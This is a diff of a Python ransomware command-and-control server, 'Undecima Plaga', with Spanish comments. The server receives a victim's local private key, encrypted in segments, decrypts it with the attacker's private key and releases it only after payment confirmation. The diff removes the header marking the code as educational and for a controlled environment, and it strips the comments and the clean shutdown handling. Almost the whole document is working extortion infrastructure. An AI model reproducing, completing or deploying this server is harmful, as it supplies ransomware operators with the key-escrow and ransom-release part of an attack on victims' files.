@@ -1,14 +1,4 @@
 #!/usr/bin/env python3
-"""
-=========================================================
-  UNDECIMA PLAGA — Servidor C&C
-=========================================================
-  PROPOSITO EDUCATIVO - ENTORNO CONTROLADO
-
-  Uso:
-    python3 servidor_cc_final.py -p 9999 --privada llave_privada_permanente.pem
-=========================================================
-"""
 
 import socket
 import zipfile
@@ -20,10 +10,7 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
 
-# ═════════════════════════════════════════════
-#  PROTOCOLO DE SOCKET (no tocar)
-# ═════════════════════════════════════════════
-
+#  PROTOCOLO DE SOCKET (Griss)
 def _recibir_exacto(sock, n):
     datos = b''
     while len(datos) < n:
@@ -41,11 +28,7 @@ def recibir_bytes(sock) -> bytes:
     longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
     return _recibir_exacto(sock, longitud)
 
-
-# ═════════════════════════════════════════════
 #  CARGA DE LLAVE PRIVADA PERMANENTE
-# ═════════════════════════════════════════════
-
 def cargar_privada_permanente(ruta):
     """Carga la llave privada del atacante para descifrar lo que mande la victima."""
     with open(ruta, 'rb') as f:
@@ -53,15 +36,10 @@ def cargar_privada_permanente(ruta):
             f.read(), password=None, backend=default_backend()
         )
 
-
-# ═════════════════════════════════════════════
 #  DESCIFRADO Y RECONSTRUCCION DE LLAVE PRIVADA LOCAL
-# ═════════════════════════════════════════════
-
 def procesar_zip_y_descifrar(nombre_zip, privada_perm):
     """
-    Abre el ZIP recibido del ransomware, descifra cada segmento
-    en orden correcto y reconstruye la llave privada local de la victima.
+    Abre el ZIP recibido del ransomware, descifra cada segmento en orden correcto y reconstruye la llave privada local de la victima.
 
     El ZIP contiene: seg0.bin, seg1.bin, seg2.bin...
     Cada segmento fue cifrado con RSA-OAEP usando la llave publica permanente.
@@ -69,8 +47,10 @@ def procesar_zip_y_descifrar(nombre_zip, privada_perm):
     llave_privada_local_bytes = b""
     with zipfile.ZipFile(nombre_zip, 'r') as af:
         num_segmentos = len(af.namelist())
+        
         for i in range(num_segmentos):
             nombre = f"seg{i}.bin"
+            
             if nombre in af.namelist():
                 segmento_cifrado = af.read(nombre)
                 segmento_claro = privada_perm.decrypt(
@@ -84,21 +64,15 @@ def procesar_zip_y_descifrar(nombre_zip, privada_perm):
                 llave_privada_local_bytes += segmento_claro
     return llave_privada_local_bytes
 
-
-# ═════════════════════════════════════════════
 #  SERVIDOR PRINCIPAL
-# ═════════════════════════════════════════════
-
 def crear_socket_servidor(puerto, ruta_privada):
     """
     Inicia el servidor C&C en modo escucha.
-
-    Flujo:
       1. Carga la llave privada permanente
       2. Espera conexion del ransomware
       3. Recibe el ZIP con los segmentos cifrados
       4. Descifra y reconstruye la llave privada local
-      5. Espera confirmacion de pago (Enter)
+      5. Espera confirmacion de pago
       6. Envia la llave privada local al ransomware
     """
     privada_perm = cargar_privada_permanente(ruta_privada)
@@ -112,7 +86,6 @@ def crear_socket_servidor(puerto, ruta_privada):
     print("="*60)
     print("  UNDECIMA PLAGA — Servidor C&C")
     print(f"  Esperando en el puerto {puerto}...")
-    print("  Ctrl+C para detener")
     print("="*60)
 
     try:
@@ -151,15 +124,10 @@ def crear_socket_servidor(puerto, ruta_privada):
                 cliente_soc.close()
                 print(f"[+] Conexion con {addr} cerrada.")
 
-    except KeyboardInterrupt:
-        print("\n[+] Servidor detenido.")
+    #except KeyboardInterrupt:
+        #print("\n[+] Servidor detenido.")
     finally:
         servidor.close()
-
-
-# ═════════════════════════════════════════════
-#  PUNTO DE ENTRADA
-# ═════════════════════════════════════════════
 
 if __name__ == "__main__":
     all_args = argparse.ArgumentParser(description="Undecima Plaga — Servidor C&C (educativo)")
